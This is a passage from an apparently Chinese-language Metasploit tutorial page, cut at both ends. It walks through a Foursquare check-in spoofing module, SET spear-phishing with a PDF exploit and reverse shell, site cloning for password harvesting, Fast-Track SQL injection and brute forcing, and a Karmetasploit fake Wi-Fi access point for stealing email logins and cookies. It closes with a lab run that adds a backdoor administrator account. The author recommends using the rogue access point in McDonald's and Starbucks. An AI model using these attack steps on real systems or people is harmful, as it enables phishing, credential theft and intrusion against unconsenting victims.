run</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">搜索所有http相关扫描模块：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`search scanner/http`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">附加模块深层剖析：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>cd /opt/framework3/msf3/modules/auxiliary/admin/
wget <a href="http://carnal0wnage.googlecode.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursqueare.rb" target="_blank" rel="noopener noreferrer">http://carnal0wnage.googlecode.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursqueare.rb</a></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">代码分析:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">```ruby</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">require ‘msf/core’</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class Metasploit3 &lt; Msf::Auxiliary #导入Auxiliaary类</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#Exploit mixins should be called first</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf::Exploit::Remote::HttpClient #导入HTTPClient方法</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf::Auxiliary::Report</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def initialize</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">super(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Name’ =&gt; ‘Foursquare Location Poster’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Version’ =&gt; ‘$Revision:$’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Description’ =&gt; ‘F*ck with Foursquare,be anywhere you want to be by venue id’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Author’ =&gt; [‘CG’],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘License’ =&gt; MSF_LICENSE,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘References’ =&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[‘URL’,’http://groups.google.com/group/foursquare-api’],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[‘URL’,’http://www.mikekey.com/im-a-foursquare-cheater/’],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#todo pass in geocoords instead of venueid,create a venueid, other tom foolery</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">register_options(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Opt::RHOST(‘api.foursquare.com’),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OptString.new(‘VENUEID’,[true,’foursquare venueid’,’185675’]),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OptString.new(‘USERNAME’,[true,’foursquare username’,’username’]),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OptString.new(‘PASSWORD’,[true,’foursquare password’,’password’]),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">],self.class)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">begin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user = datastore[‘USERNAME’]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pass = datasore[‘PASSWORD’]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">venid = datastore[‘VENUEID’]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user_pass = Rex::Text.encode_base64(user + “:” + pass)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">decode = Rex::Text.decode_base64(user_pass)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">postrequest = “twitter=1\n” #add facebook=1 if you want facebook</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print_status(“Base64 Encode User/Pass: #{user_pass}”) #debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print_status(“Base64 Decode User/Pass: #{decode}”)  #debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">res = send_request_cgi({</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘uri’ =&gt; “/v1/checkin?vid=#{venid}”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘version’ =&gt; “1.1”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘method’ =&gt; ‘POST’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘data’ =&gt; postrequest,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘headers’ =&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Authorization’ =&gt; “Basic #{user_pass}”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Proxy-Connection’ =&gt; “Keep-Alive”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">},25)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print_status(“#{res}”)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rescue ::Timeout::Error, ::Errno::EPIPE =&gt;e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pus e.message</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>ruby白痴一个，代码我也没看懂，不解释了</p><p>如何使用：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; search foursquare</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use admin/foursquare</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set VENUEID 2584421</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set USERNAME msf@elwood.net</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PASSWORD ilovemetasploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="十社会工程学工具集set">十．社会工程学工具集（SET）<a class="hash-link" href="#十社会工程学工具集set" title="标题的直接链接">​</a></h2><p>主要功能：hacking the human mind。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1set基本配置">1、SET基本配置：<a class="hash-link" href="#1set基本配置" title="标题的直接链接">​</a></h3><p>SET位于/pentest/exploits/set/目录</p><p>更新：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /pentest/exploits/set/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">svn update</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>配置文件config/set_config，当使用基于web的攻击方式时可以将email功能打开：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">vi config/set_config:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">METASPLOIT_PATH=/opt/framework3/msf3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WEBATTACK_EMAIL=ON</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用Java applet attack进行攻击的时候默认使用Microsoft作为发布者名称，如果需要自定义则需要安装JDK并打开配置项：</p><p><code>SELF_SIGNED_APPLET=ON</code></p><p>SET默认打开AUTO_DETECT项，自动探测本机IP并用于攻击中的各项配置。如果本机是多网卡需要手动指定IP，则需将此项关闭：</p><p><code>AUTO_DETECT=OFF</code></p><p>SET默认使用内建的python提供的web server供使用，如需使用apache作为服务则需要本机安装apache并打开配置项：</p><p><code>APACHE_SERVER=ON</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2网络钓鱼攻击">2、网络钓鱼攻击:<a class="hash-link" href="#2网络钓鱼攻击" title="标题的直接链接">​</a></h3><p>Spear-Phishing Attack Vector,利用文件格式漏洞（如PDF）等生成后门并通过email（GMAIL,SENDMAIL,）向目标发送带后门附件的电子邮件，诱使目标打开附件激活后门。</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./set</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">此时选择菜单1.Spear-Phishing Attack Vectors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">继续选择：1.Perform a Mass Email Attack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择exploit：8.Adobe Collab.collectEmailInfo Buffer Overflow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择payload：4.Windows Reverse TCP Shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择是否更改文件名：1.Keep the filename</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择发送邮件方式1.Email Attack Single Email Address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择邮件模板1.Pre-Defined Template</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5.Status Report</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">输入收件方email地址：webmanager@exmaple.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择发件方式：1.Use a GMAIL Account for your email attack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">输入发件gmail和密码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择是否立即监听端口等待连接:yes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此时SET会使用刚才的设定全自动监听指定端口。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3web方式攻击">3、WEB方式攻击：<a class="hash-link" href="#3web方式攻击" title="标题的直接链接">​</a></h3><p>SET可以克隆一个网站并植入后门以此迷惑目标打开此网站并中招。</p><ul><li>Java Applet方式：最成功的方式之一，并不是利用java的漏洞，而是当目标浏览含后门的仿冒站点时会被询问是否允许执行web中的java applet，一旦点击允许则payload开始运行，目标将被重定向到真实的网站。</li><li>用户端（Client-side）web exploit方式：利用用户端存在的软件漏洞，一般使用0day进行攻击的效果最好。</li><li>账号密码获取（Username and Password Harvesting）：通过克隆一个目标站并诱使攻击目标登陆，截获其账号密码。例如截获GMAIL密码。</li><li>标签页绑架（Tabnabbing）：当目标打开多个标签页浏览网站并切换标签页时，网站侦测到目标的行为并显示让目标等待的信息，恰好目标打开了被绑架的标签页并要求在相似程度惊人的网站里输入登陆凭据，当目标输入之后登陆信息即被截获，同时被重定向到真实网站。</li><li>中间人攻击（Man-Left-in-the-Middle）：此方式使用已经被攻陷的网站的HTTP请求或者网站的XSS漏洞让用户的登陆信息发送至攻击者的HTTP服务器。如果你发现了一个网站的XSS漏洞，可以利用此漏洞构造一个url发送给目标诱使其打开并登陆以截获登陆信息。</li><li>Web Jacking：当目标打开我们的网站时会有一个链接显示为正确的web地址，此时若目标打开此仿冒链接会被定向到我们的仿冒网站，其登陆信息会被截获。</li><li>混合模式（multi-attack）：可同时使用以上多种攻击手段以提高成功率。</li><li>介质感染攻击（Infectious Media Generator）：可以让你生成一张光盘或者u盘，里面包含autorun.inf来运行指定的后门文件或者file-format漏洞文件。</li><li>迷你USB人机接口设备（Teensy USB HID）：当电脑插入USB设备且autorun.inf被禁用时，可使用此方法将USB设备模拟成一个键盘或鼠标设备，进而截获目标机器的击键记录。</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="set其他特殊功能">SET其他特殊功能：<a class="hash-link" href="#set其他特殊功能" title="标题的直接链接">​</a></h3><p>包括SET交互式shell，可用来替代meterpreter；远程管理工具（RATTE）；HTTP隧道，当目标主机只开放HTTP端口对外放行时可通过此功能与主机进行通信；WEB-GUI，包含了常用攻击和无线攻击向导，输入./set-web即可运行。</p><p>（SET新版本变动较大，请自行摸索。）</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="十一fast-track">十一．FAST-TRACK<a class="hash-link" href="#十一fast-track" title="标题的直接链接">​</a></h2><p>Fast-Track和SET一样都是python编写的，同样是使用MSF提供的payload以及用户端攻击向导等，作为对MSF的补充，它提供了如MSSQL攻击，更多的exploit，浏览器攻击向导等。fasttrack位于/pentest/exploits/fasttrack/。</p><p>交互式模式：<code>./fast-track.py -i</code></p><p>命令行模式：<code>./fast-track.py -c</code></p><p>Web界面模式：<code>./fast-track.py -g</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1mssql工具">1、MSSQL工具：<a class="hash-link" href="#1mssql工具" title="标题的直接链接">​</a></h3><p>MSSQL注入漏洞攻击：</p><p>攻击时你只需要输入有注入漏洞的url地址，地址里面用INJECTHERE标识可注入字段，如<a href="http://example.com/show.asp?id=INJECTHERE&amp;date=2012%EF%BC%8Cfast-track%E4%BC%9A%E5%85%A8%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%B8%80%E6%97%A6%E6%88%90%E5%8A%9F%E4%BC%9A%E7%BB%99%E4%BD%A0%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AAcmd" target="_blank" rel="noopener noreferrer">http://example.com/show.asp?id=INJECTHERE&amp;date=2012，fast-track会全自动注入，一旦成功会给你返回一个cmd</a> shell。
注入也支持POST参数，如果是POST的话更加简单，只需要你输入url地址，fast-track会自动判断并尝试进行注入。</p><p>SQL暴力破解：另外一个实用的功能是暴力破解器（MSSQL Bruter），可以寻找mssql弱口令，一旦获取到一个sa权限的访问权限，将自动返回一个shell。</p><p>SQL注入批量扫描器（SQLPwnage）：此功能可扫描指定网段的所有打开80端口的主机，并扫描是否存在sql注入点，一旦发现注入点将自动尝试攻击并通过xp_cmdshell获取系统权限。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2binary-hex-转换器">2、Binary-HEX 转换器：<a class="hash-link" href="#2binary-hex-转换器" title="标题的直接链接">​</a></h3><p>当你已经进入一个系统且需要上传可执行文件上去，就可以使用这个工具将可执行的二 进制文件转换为HEX十六进制编码，然后复制粘贴过去即可。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3批量用户端攻击">3、批量用户端攻击：<a class="hash-link" href="#3批量用户端攻击" title="标题的直接链接">​</a></h3><p>和浏览器攻击差不多，但是增加了对目标的ARP缓冲区和DNS感染（只能是在测试者 和目标处于同一网段的情况下），以及MSF里面没有的浏览器溢出exploit。当目标浏览 恶意网站的时候，fast-track尝试着使用所有的exp对目标机器进行溢出，一旦某个exp 起作用将获取到目标机器的控制权限。</p><p>（新版本fasttrack中还加入了Autopwn Automation、Nmap Scripting Engine、Exploits、Payload Generator等新功能。）</p><p>脚本化的工具有时确实能减少很多工作时间，但是不能完全依赖于这类自动程度很高的工具，特别是在用这些工具搞不定目标的时候，手工测试的能力往往才是王道，细节决定成败。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="十二karmerasploit">十二．KARMERASPLOIT<a class="hash-link" href="#十二karmerasploit" title="标题的直接链接">​</a></h2><p>Karmetasploit = Karma + Metasploit，也可以说成它是MSF的KARMA实现。</p><p>Karma和MSF一样也是使用ruby语言编写的，其功能是建立一个虚假的无线接入点，等待目标连接上钩。与MSF结合可实现更强大的功能。Karmetasploit集成了DNS,POP3，IMAP4，SMTP,FTP,SMB,HTTP等服务用于攻击，模块位于modules/auxiliary/server目录下。</p><p>基本配置：</p><p>需要的配置不多，首先需要配置一个DHCP服务为目标提供动态IP分配，配置文件：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">option domain-name-servers 10.0.0.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default-lease-time 60;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">max-lease-time 72;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ddns-update-style none;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">authoritative;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log-facility local7;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">subnet 10.0.0.0 netmask 255.255.255.0 {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">range 10.0.0.100 10.0.0.254;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">option routers 10.0.0.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">option domain-name-servers 10.0.0.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>将配置文件保存在/etc/dhcp3/dhcpd.conf</p><p>下一步下载karma  msf脚本：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget http://www.offensive-security.com/downloads/karma.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#将网卡激活为监听模式：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">airmon-ng start wlan0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#创建伪装接入点,-P 可被扫描到，-C 信号发射速率，-e 接入点名称（需要具有欺骗性），-v 指定网卡，mon0为上一步完成后生成的：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">airbase-ng -P -C 30 -e "China-Net-Free" -v mon0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#此时会生成一个名为at0的新网卡接口。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#接着打开DHCP服务：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#检查是否成功启动：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ps aux|grep dhcpd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tail -f /var/log/messages</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#下一步加载karma脚本：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; resource karma.rc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>等待收获：</p><p>当对方打开邮件客户端并登陆收取邮件，那么他的账户密码将被截获，因为他所连接的DNS和POP3都是虚假的。
当对方打开浏览器准备浏览网页时karma开始截取cookie，建立虚假email，DNS等服务，加载exploits来对付客户端浏览器，如果走运的话可以获取到shell。
总结：建议这招可以拿到麦当劳，星巴克用，效果更好。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="十三构建自己的模块编写自己的exploitmeterpreter脚本编程">十三．构建自己的模块，编写自己的exploit，meterpreter脚本编程<a class="hash-link" href="#十三构建自己的模块编写自己的exploitmeterpreter脚本编程" title="标题的直接链接">​</a></h2><p>这三章留着后面看，需要有ruby基础等编程基础。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="十四渗透实战演习">十四．渗透实战演习<a class="hash-link" href="#十四渗透实战演习" title="标题的直接链接">​</a></h2><p>首先需要下载并安装一个专门用来练习渗透的虚拟机Metasploitable：</p><p><a href="http://updates.metasploit.com/data/Metasploitable.zip.torrent" target="_blank" rel="noopener noreferrer">http://updates.metasploit.com/data/Metasploitable.zip.torrent</a></p><p>虚拟机IP：172.16.32.162 用户名密码：msfadmin</p><p>WINXP：172.16.32.131   开放80端口 有防火墙</p><p>情报收集：</p><p><code>nmap -sT -P0 172.16.32.131</code></p><p>msfconsole：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /opt/framework3/msf3/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lhost 172.15.32.129</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lport 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">load auto_add_route</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit -j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run getgui -e -f 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net user msf msf /add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net localgroup administrators msf /add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">upload nmap.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap.exe -sT -A -P0 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ftp/ftp_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/smtp/smtp_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS  172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" 